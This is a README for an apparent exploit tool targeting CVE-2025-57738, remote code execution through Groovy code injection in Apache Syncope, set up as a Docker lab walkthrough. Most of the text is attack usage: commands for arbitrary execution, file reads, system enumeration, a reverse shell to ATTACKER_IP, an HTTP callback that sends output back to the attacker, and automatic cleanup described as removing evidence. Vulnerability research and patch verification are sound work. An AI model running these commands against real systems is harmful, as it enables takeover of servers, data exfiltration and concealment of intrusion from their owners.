# CVE-2025-57738 - Apache Syncope Groovy Code Injection RCE

- **For More Details Check The Blog Post:** [SecureLayer7 — CVE-2025-57738 Apache Syncope Groovy Code Injection RCE](https://blog.securelayer7.net/cve-2025-57738-apache-syncope-groovy-rce/)

## Overview
Apache Syncope allows administrators to upload custom Groovy implementations via its REST API. In vulnerable versions (all 2.x, 3.x < 3.0.14, 4.x < 4.0.2), the `ImplementationManager` compiles Groovy code using a plain `GroovyClassLoader` with NO sandbox, NO `CompilerConfiguration`, and NO AST restrictions. An attacker with admin credentials can upload a Groovy class with a `static { }` initializer that executes arbitrary code at compile time — achieving full Remote Code Execution before any interface validation occurs.

- **CVSS:** 7.2 (High)
- **Fixed in:** Apache Syncope 3.0.14 / 4.0.2
- **Patch:** Added `SandboxTransformer`, `RejectASTTransformsCustomizer`, and `groovy.blacklist` via `net.tirasa:groovy-security-sandbox:1.0.0`
- **Blog:** [SecureLayer7 — CVE-2025-57738 Apache Syncope Groovy Code Injection RCE](https://blog.securelayer7.net/cve-2025-57738-apache-syncope-groovy-rce/)

## Step 1: Start the Lab
```bash
cd lab/
docker compose up --build -d
```
Wait ~2 minutes for Syncope to initialize (JPA migrations). Verify:
```bash
curl -sf http://localhost:8080/syncope/rest/users/self -u admin:password -H "X-Syncope-Domain: Master" | head
```

## Step 2: Check Vulnerability
```bash
cd exploit/
pip install -r requirements.txt
python exploit.py -t http://localhost:8080 --check
```

## Step 3: Run the Exploit
```bash
# Execute a command (output saved to /tmp/pwned on target + callback)
python exploit.py -t http://localhost:8080 --cmd "id"

# Read a file from the target
python exploit.py -t http://localhost:8080 --read /etc/hostname

# Collect system information
python exploit.py -t http://localhost:8080 --info

# Reverse shell
python exploit.py -t http://localhost:8080 --reverse-shell ATTACKER_IP:4444

# Enumerate existing implementations
python exploit.py -t http://localhost:8080 --enum
```

### Example Output
```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2025-57738 — Apache Syncope                           ║
║  Groovy Code Injection → Remote Code Execution             ║
║  Severity: HIGH (CVSS 7.2)                                 ║
╚══════════════════════════════════════════════════════════════╝

[*] Target: http://localhost:8080
[*] Command: id

[*] Creating malicious Groovy implementation 'cve2025_wqb9ps26'...
[+] Implementation 'cve2025_wqb9ps26' created!
[+] Groovy class loaded (static initializer executed)
[+] Groovy code compiled and loaded — static initializer executed!
[+] Output written to /tmp/pwned on target
[*] Waiting for output callback... received!

============================================================
  COMMAND OUTPUT
============================================================
uid=0(root) gid=0(root) groups=0(root)
============================================================

[*] Cleaning up 1 implementation(s)...
[+] Cleanup complete
```

## Step 4: Retrieve Output
The exploit always writes command output to `/tmp/pwned` on the target. There are three ways to retrieve it:

### Option A: HTTP Callback Listener (automatic)
The exploit starts a temporary HTTP listener on your machine. The Groovy payload POSTs the output back to you automatically. This is the default behavior — no extra flags needed.
```
[*] Waiting for output callback... received!
============================================================
  COMMAND OUTPUT
============================================================
uid=0(root) gid=0(root) groups=0(root)
============================================================
```
> **Note:** This only works if the target can reach your IP (same network, VPN, etc.). If the callback times out after 10 seconds, fall back to Option B or C.

### Option B: Docker Exec (lab environment)
Use `--container` to have the exploit read `/tmp/pwned` automatically via `docker exec`:
```bash
python exploit.py -t http://localhost:8080 --cmd "id" --container syncope-vuln-cve-2025-57738
```

### Option C: Manual Verification
If both callback and docker fail, read the output file manually:
```bash
docker exec syncope-vuln-cve-2025-57738 bash -c "cat /tmp/pwned"
# uid=0(root) gid=0(root) groups=0(root)
```

## Step 5: Verify Patch
```bash
# Check patched instance (port 9080) — should report PATCHED
python exploit.py -t http://localhost:9080 --check
```

## How It Works
1. The exploit authenticates to Syncope's REST API using admin credentials (default: `admin:password`)
2. It queries `/syncope/rest/openapi.json` to detect the Syncope version (no auth required)
3. A malicious Groovy class with a `static { }` initializer is crafted containing the attacker's command
4. The class is uploaded via `POST /syncope/rest/implementations/COMMAND/{key}` with `engine: GROOVY`
5. Syncope calls `GroovyClassLoader.parseClass(body)` — the static initializer executes at class loading time
6. Command output is written to `/tmp/pwned` on the target (always)
7. The exploit starts an HTTP callback listener — the Groovy payload POSTs the output back to the attacker's machine for direct display
8. The uploaded implementation is automatically deleted to remove evidence

### Output Retrieval Flow
```
Command runs on target
        │
        ├──→ /tmp/pwned              (always written)
        │
        └──→ HTTP POST to listener   (best-effort callback)
                    │
             ┌──────┴──────┐
             │ Received    │ Timeout
             │ Show output │ Try --container
             │             │ or show manual cmd
             ▼             ▼
```

## Vulnerable Endpoints
| Endpoint | Implementation Type | Vulnerable |
|----------|-------------------|-----------|
| `/syncope/rest/implementations/COMMAND/{key}` | Custom commands | Yes |
| `/syncope/rest/implementations/TASKJOB_DELEGATE/{key}` | Scheduled tasks | Yes |
| `/syncope/rest/implementations/LOGIC_ACTIONS/{key}` | Logic actions | Yes |
| `/syncope/rest/implementations/ACCOUNT_RULE/{key}` | Account rules | Yes |
| `/syncope/rest/implementations/PASSWORD_RULE/{key}` | Password rules | Yes |
| `/syncope/rest/implementations/RECIPIENTS_PROVIDER/{key}` | Notification recipients | Yes |

All use the same `GroovyClassLoader.parseClass()` code path with no sandbox.
